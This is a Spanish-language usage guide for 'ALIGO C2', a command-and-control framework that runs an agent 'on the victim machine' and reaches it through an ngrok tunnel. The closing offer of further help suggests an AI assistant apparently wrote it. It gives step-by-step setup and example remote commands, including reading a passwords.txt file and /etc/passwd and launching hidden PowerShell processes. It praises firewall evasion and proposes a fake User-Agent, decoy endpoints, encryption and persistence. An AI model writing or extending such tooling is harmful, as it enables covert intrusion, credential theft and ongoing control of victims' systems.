# Guía de Uso - ALIGO C2 con HTTPS

## 🎯 Cambios realizados

Tu servidor C2 ha sido migrado de **TCP** a **HTTPS/HTTP** con las siguientes mejoras:

- ✅ **Protocolo HTTP/HTTPS** (mejor evasión de firewalls)
- ✅ **Compatible con ngrok** (`ngrok http 5000`)
- ✅ **Misma terminal interactiva** (comandos idénticos)
- ✅ **Mismas capacidades** de ejecución de comandos

---

## 📦 Instalación de dependencias

```bash
cd /home/jose/ArchivoPortable/Hackaton/aligo-c2-frameworkk
pip install -r requirements.txt
```

O manualmente:
```bash
pip install flask requests
```

---

## 🚀 Uso paso a paso

### 1️⃣ Iniciar el servidor

```bash
cd server
python3 server.py
```

Verás:
```
============================================================
  ALIGO C2 - Servidor HTTPS
============================================================
[*] Servidor HTTP escuchando en 0.0.0.0:5000
[*] Usa ngrok con: ngrok http 5000

Consola de operador. Comandos:
  list                  -> lista agentes conectados
  use <agent_id> <cmd>  -> manda un comando a un agente
  use @agent <cmd>      -> usa el único agente (si solo hay uno)
  exit                  -> salir

> 
```

### 2️⃣ Exponer con ngrok

En otra terminal:

```bash
ngrok http 5000
```

Copia la URL que aparece, por ejemplo:
```
https://abc123-def456.ngrok-free.app
```

### 3️⃣ Iniciar el agente (en la máquina víctima)

```bash
python3 agent/agent_ngrok.py https://abc123-def456.ngrok-free.app
```

Verás:
```
==================================================
  ALIGO C2 - Agente HTTPS
==================================================

[*] Agente ID: agent-a1b2c3
[*] Servidor: https://abc123-def456.ngrok-free.app
[*] Intentando checkin con el servidor...
[+] ✅ Conectado al servidor como agent-a1b2c3
```

### 4️⃣ Ejecutar comandos desde el servidor

En el servidor verás:
```
[+] Agente conectado: agent-a1b2c3 desde 127.0.0.1 (DESKTOP-VICTIM)
> 
```

Ahora puedes ejecutar comandos:

```bash
# Listar agentes
> list
 - agent-a1b2c3 | DESKTOP-VICTIM | Windows | last_seen: 14:23:45

# Ejecutar comando simple
> use agent-a1b2c3 whoami
[enviado] id=f3a9 -> agent-a1b2c3: whoami

[resultado de agent-a1b2c3] (id=f3a9):
DESKTOP-VICTIM\Usuario

# Si solo hay un agente, usar @agent
> use @agent ipconfig
[auto-seleccionado] agent-a1b2c3
[enviado] id=b2c4 -> agent-a1b2c3: ipconfig
...
```

---

## 🎯 Ejemplos de comandos avanzados

### Windows

```bash
# Cambiar directorio
> use agent-abc123 cd C:\Users\Victim\Desktop

# Buscar procesos Python
> use agent-abc123 wmic process where "name='python.exe'" get ProcessId,CommandLine | findstr agent_ngrok.py

# Iniciar proceso oculto de PowerShell
> use agent-abc123 powershell -Command "Set-Location C:\temp; Start-Process python -ArgumentList 'agent_ngrok.py','https://new-ngrok.io' -WindowStyle Hidden"

# Matar proceso con delay
> use agent-abc123 cmd /c "timeout /t 5 & taskkill /F /PID 1234"

# Listar archivos
> use agent-abc123 dir C:\Users\Victim\Documents

# Descargar archivo (ver contenido)
> use agent-abc123 type C:\Users\Victim\passwords.txt

# Información del sistema
> use agent-abc123 systeminfo

# Procesos en ejecución
> use agent-abc123 tasklist

# Conexiones de red
> use agent-abc123 netstat -ano
```

### Linux

```bash
# Comandos básicos
> use agent-xyz789 whoami
> use agent-xyz789 pwd
> use agent-xyz789 ls -la /home

# Información del sistema
> use agent-xyz789 uname -a
> use agent-xyz789 cat /etc/passwd

# Procesos
> use agent-xyz789 ps aux | grep python

# Red
> use agent-xyz789 ifconfig
> use agent-xyz789 netstat -tulpn
```

---

## 🔄 Comparación TCP vs HTTPS

| Aspecto | TCP (anterior) | HTTPS (nuevo) |
|---------|----------------|---------------|
| **Comando ngrok** | `ngrok tcp 4444` | `ngrok http 5000` |
| **Inicio agente** | `python3 agent_ngrok.py HOST PUERTO` | `python3 agent_ngrok.py URL` |
| **Ejemplo agente** | `python3 agent_ngrok.py 4.tcp.ngrok.io 15432` | `python3 agent_ngrok.py https://abc.ngrok.io` |
| **Consola servidor** | ✅ Idéntica | ✅ Idéntica |
| **Comandos** | ✅ Mismos | ✅ Mismos |
| **Evasión** | ⚠️ Más detectable | ✅ Mejor camuflaje |

---

## 🐛 Troubleshooting

### El agente no se conecta

1. Verifica que el servidor esté corriendo:
   ```bash
   curl http://localhost:5000/health
   ```

2. Verifica que ngrok esté activo:
   ```bash
   curl https://tu-url.ngrok.io/health
   ```

3. Revisa que la URL del agente sea correcta (con `https://`)

### "ModuleNotFoundError: No module named 'flask'"

Instala las dependencias:
```bash
pip install -r requirements.txt
```

### Ngrok muestra "Invalid Host Header"

Esto es normal con ngrok gratis en algunas versiones. El agente debería funcionar de todos modos.

---

## 🎓 Conceptos clave

### Polling HTTP
El agente pregunta periódicamente (cada 2 segundos) si hay comandos:
```
Agente -> POST /poll -> Servidor
         <- comando o null
```

### Arquitectura
```
[Operador] 
    ↓ (comandos en consola)
[Servidor Flask] 
    ↕ (HTTP/HTTPS via ngrok)
[Agente en víctima]
    ↓ (ejecuta con subprocess)
[Sistema Operativo]
```

---

## 📝 Notas importantes

1. **Los permisos no cambian**: El agente ejecuta comandos con los mismos privilegios (user/root)
2. **Shell=True**: Todos los comandos se ejecutan en shell nativo (cmd/bash/powershell)
3. **Timeout**: Los comandos tienen timeout de 30 segundos
4. **Reconnect**: El agente se reconecta automáticamente si pierde conexión

---

## ✅ Verificación rápida

1. **Servidor funcionando**:
   ```bash
   curl http://localhost:5000/health
   # Debería responder: {"status":"ok","agents_connected":0,...}
   ```

2. **Ngrok funcionando**:
   ```bash
   curl https://tu-url.ngrok.io/health
   ```

3. **Agente conectado**:
   ```bash
   > list
    - agent-abc123 | ...
   ```

4. **Ejecutar comando**:
   ```bash
   > use @agent whoami
   [enviado] ...
   [resultado] ...
   ```

---

## 🚀 Próximos pasos (opcional)

Para mejorar aún más tu C2:

- **Jitter**: Variar el intervalo de polling aleatororiamente
- **User-Agent falso**: Parecer navegador legítimo
- **Endpoints falsos**: Agregar `/login`, `/api/v1` para camuflaje
- **Cifrado adicional**: Cifrar el payload JSON
- **Persistencia**: Hacer que el agente se inicie automáticamente

¿Necesitas ayuda con alguno de estos? 😊
